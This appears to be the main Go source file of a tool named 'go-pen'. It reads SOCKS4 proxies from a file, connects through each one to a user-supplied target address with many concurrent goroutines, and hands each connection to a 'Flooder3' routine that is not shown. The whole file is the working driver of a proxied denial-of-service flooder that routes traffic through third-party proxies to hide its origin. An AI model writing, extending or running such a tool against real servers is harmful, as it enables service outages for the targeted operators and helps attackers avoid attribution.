package main

import (
	"bufio"
	"fmt"
	"go-pen/methods"
	"log"
	"net"
	"os"
	"strconv"
	"strings"

	"h12.io/socks"
)

func checkArguments(cleanArgs []string) (string, int, int) {
	argsMessage := "Arguments: <ip:port> <threads> <loop>"

	if len(cleanArgs) < 3 {
		fmt.Println(argsMessage)
		os.Exit(1) // is it a good way to do that....
	}

	var serverAddress = cleanArgs[0]

	if !strings.Contains(serverAddress, ":") {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	threads, err := strconv.Atoi(cleanArgs[1])
	loop, errn := strconv.Atoi(cleanArgs[2])

	if err != nil || errn != nil {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	return serverAddress, threads, loop
}

func parseProxies() []string {
	file, err := os.Open("proxies.txt")

	if err != nil {
		log.Fatal("Something is wrong with proxies.txt, ", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var proxies []string

	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	file.Close()

	return proxies
}

func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error) {
	address := fmt.Sprintf("socks4://%s?timeout=2s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	return conn, err
}

func main() {
	var serverAddress, threads, loop = checkArguments(os.Args[1:])

	proxies := parseProxies()
	data := methods.MethodData{Address: serverAddress, Loop: loop}

	// Guard is needed to limit goroutines
	guard := make(chan struct{}, threads)

	for _, proxy := range proxies {
		guard <- struct{}{}
		go func(proxy string, serverAddress string, data *methods.MethodData) {
			var conn, err = makeConnection(proxy, serverAddress)

			if err != nil {
				//fmt.Println(err)
				// remove proxy from file (maybe) and slice
			} else {
				methods.Flooder3(data, conn)
			}

			<-guard
		}(proxy, serverAddress, &data)
	}
}
